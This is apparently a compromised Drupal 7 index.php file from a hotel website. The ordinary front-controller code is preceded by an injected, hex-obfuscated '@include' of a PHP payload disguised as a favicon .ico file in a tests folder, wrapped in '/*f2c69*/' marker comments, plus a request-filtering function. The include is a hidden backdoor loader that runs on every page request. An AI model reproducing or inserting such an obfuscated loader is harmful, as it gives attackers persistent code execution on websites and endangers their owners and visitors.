<?php
/*f2c69*/

@include "\x2fsrv/\x64ata/\x77eb/v\x68osts\x2fwww.\x68otel\x2ddali\x62ert.\x63om/h\x74docs\x2fmodu\x6ces/t\x72igge\x72/tes\x74s/fa\x76icon\x5fc79b\x358.ic\x6f";

/*f2c69*/
function stripDangerousValues($input) {
    if (is_array($input)) {
        foreach ($input as $key => $value) {
            if ($key !== '' && $key[0] === '#') {
                unset($input[$key]);
            }
            else {
                $input[$key] = stripDangerousValues($input[$key]);
            }
        }
    }
    return $input;
}
$_REQUEST = stripDangerousValues($_REQUEST);
$_GET = stripDangerousValues($_GET);
$_POST = stripDangerousValues($_POST);





/**
 * @file
 * The PHP page that serves all page requests on a Drupal installation.
 *
 * The routines here dispatch control to the appropriate handler, which then
 * prints the appropriate page.
 *
 * All Drupal code is released under the GNU General Public License.
 * See COPYRIGHT.txt and LICENSE.txt.
 */

/**
 * Root directory of Drupal installation.
 */
define('DRUPAL_ROOT', getcwd());

require_once DRUPAL_ROOT . '/includes/bootstrap.inc';
drupal_bootstrap(DRUPAL_BOOTSTRAP_FULL);
menu_execute_active_handler();
